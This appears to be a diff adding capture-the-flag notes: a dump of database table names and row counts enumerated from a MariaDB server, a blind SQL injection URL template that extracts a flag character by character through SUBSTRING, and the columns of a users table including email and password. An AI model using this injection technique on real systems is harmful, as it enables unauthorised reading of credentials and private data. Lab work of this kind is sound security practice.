@@ -1,0 +1,213 @@
+0:              all_plugins
+1:              applicable_roles
+2:              character_sets
+3:              check_constraints
+4:              collations
+5:              collation_character_set_applicability
+6:              columns
+7:              column_privileges
+8:              enabled_roles
+9:              engines
+10:             events
+11:             files
+12:             global_status
+13:             global_variables
+14:             keywords
+15:             key_caches
+16:             key_column_usage
+17:             optimizer_trace
+18:             parameters
+19:             partitions
+20:             plugins
+21:             processlist
+22:             profiling
+23:             referential_constraints
+24:             routines
+25:             schemata
+26:             schema_privileges
+27:             session_status
+28:             session_variables
+29:             statistics
+30:             sql_functions
+31:             system_variables
+32:             tables
+33:             tablespaces
+34:             table_constraints
+35:             table_privileges
+36:             triggers
+37:             user_privileges
+38:             views
+39:             client_statistics
+40:             index_statistics
+41:             innodb_sys_datafiles
+42:             geometry_columns
+43:             innodb_sys_tablestats
+44:             spatial_ref_sys
+45:             innodb_buffer_page
+46:             innodb_trx
+47:             innodb_cmp_per_index
+48:             innodb_metrics
+49:             innodb_lock_waits
+50:             innodb_cmp
+51:             thread_pool_waits
+52:             innodb_cmp_reset
+53:             thread_pool_queues
+54:             table_statistics
+55:             innodb_sys_fields
+56:             innodb_buffer_page_lru
+57:             innodb_locks
+58:             innodb_ft_index_table
+59:             innodb_cmpmem
+60:             thread_pool_groups
+61:             innodb_cmp_per_index_reset
+62:             innodb_sys_foreign_cols
+63:             innodb_ft_index_cache
+64:             innodb_buffer_pool_stats
+65:             innodb_ft_being_deleted
+66:             innodb_sys_foreign
+67:             innodb_cmpmem_reset
+68:             innodb_ft_default_stopword
+69:             innodb_sys_tables
+70:             innodb_sys_columns
+71:             innodb_ft_config
+72:             user_statistics
+73:             innodb_sys_tablespaces
+74:             innodb_sys_virtual
+75:             innodb_sys_indexes
+76:             innodb_sys_semaphore_waits
+77:             innodb_mutexes
+78:             user_variables
+79:             innodb_tablespaces_encryption
+80:             innodb_ft_deleted
+81:             thread_pool_stats
+82: 0           column_stats
+83: 0           columns_priv
+84: 1           db
+85: 0           event
+86: 0           func
+87: 2           general_log
+88: 0           gtid_slave_pos
+89: 39          help_category
+90: 464         help_keyword
+91: 102         help_relation
+92: 508         help_topic
+93: 0           host
+94: 0           index_stats
+95: 13          innodb_index_stats
+96: 4           innodb_table_stats
+97: 0           plugin
+98: 2           proc
+99: 0           procs_priv
+100: 0          proxies_priv
+101: 0          roles_mapping
+102: 0          servers
+103: 2          slow_log
+104: 0          table_stats
+105: 1          tables_priv
+106: 0          time_zone
+107: 0          time_zone_leap_second
+108: 0          time_zone_name
+109: 0          time_zone_transition
+110: 0          time_zone_transition_type
+111: 0          transaction_registry
+112: 2          user
+113: 0          accounts
+114: 0          cond_instances
+115: 0          events_stages_current
+116: 0          events_stages_history
+117: 0          events_stages_history_long
+118: 0          events_stages_summary_by_account_by_eve
+119: 0          events_stages_summary_by_host_by_event_
+120: 0          events_stages_summary_by_thread_by_even
+121: 0          events_stages_summary_by_user_by_event_
+122: 0          events_stages_summary_global_by_event_n
+123: 0          events_statements_current
+124: 0          events_statements_history
+125: 0          events_statements_history_long
+126: 0          events_statements_summary_by_account_by
+127: 0          events_statements_summary_by_digest
+128: 0          events_statements_summary_by_host_by_ev
+129: 0          events_statements_summary_by_program
+130: 0          events_statements_summary_by_thread_by_
+131: 0          events_statements_summary_by_user_by_ev
+132: 0          events_statements_summary_global_by_eve
+133: 0          events_transactions_current
+134: 0          events_transactions_history
+135: 0          events_transactions_history_long
+136: 0          events_transactions_summary_by_account_
+137: 0          events_transactions_summary_by_host_by_
+138: 0          events_transactions_summary_by_thread_b
+139: 0          events_transactions_summary_by_user_by_
+140: 0          events_transactions_summary_global_by_e
+141: 0          events_waits_current
+142: 0          events_waits_history
+143: 0          events_waits_history_long
+144: 0          events_waits_summary_by_account_by_even
+145: 0          events_waits_summary_by_host_by_event_n
+146: 0          events_waits_summary_by_instance
+147: 0          events_waits_summary_by_thread_by_event
+148: 0          events_waits_summary_by_user_by_event_n
+149: 0          events_waits_summary_global_by_event_na
+150: 0          file_instances
+151: 0          file_summary_by_event_name
+152: 0          file_summary_by_instance
+153: 251        global_status
+154: 279        host_cache
+155: 0          hosts
+156: 0          memory_summary_by_account_by_event_name
+157: 0          memory_summary_by_host_by_event_name
+158: 0          memory_summary_by_thread_by_event_name
+159: 0          memory_summary_by_user_by_event_name
+160: 0          memory_summary_global_by_event_name
+161: 0          metadata_locks
+162: 0          mutex_instances
+163: 0          objects_summary_global_by_type
+164: 5          performance_timers
+165: 0          prepared_statements_instances
+166: 1          replication_applier_configuration
+167: 1          replication_applier_status
+168: 1          replication_applier_status_by_coordinat
+169: 1          replication_connection_configuration
+170: 0          rwlock_instances
+171: 0          session_account_connect_attrs
+172: 0          session_connect_attrs
+173: 251        session_status
+174: 0          setup_actors
+175: 15         setup_consumers
+176: 0          setup_instruments
+177: 0          setup_objects
+178: 5          setup_timers
+179: 0          socket_instances
+180: 0          socket_summary_by_event_name
+181: 0          socket_summary_by_instance
+182: 0          status_by_account
+183: 0          status_by_host
+184: 0          status_by_thread
+185: 0          status_by_user
+186: 0          table_handles
+187: 0          table_io_waits_summary_by_index_usage
+188: 0          table_io_waits_summary_by_table
+189: 0          table_lock_waits_summary_by_table
+190: 0          threads
+191: 0          user_variables_by_thread
+192: 0          users
+193: 0          flag_table
+194: 8          config
+195: 3          users
+
+http://10.102.100.187/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT flag FROM flag_table LIMIT {},1),{},1)=CHAR({}) OR'
+
+
+
+
+
+
+
+users table columns:
+0: user               
+1: current_connections
+2: total_connections  
+3: email              
+4: password           
+5: name               
+6: role 
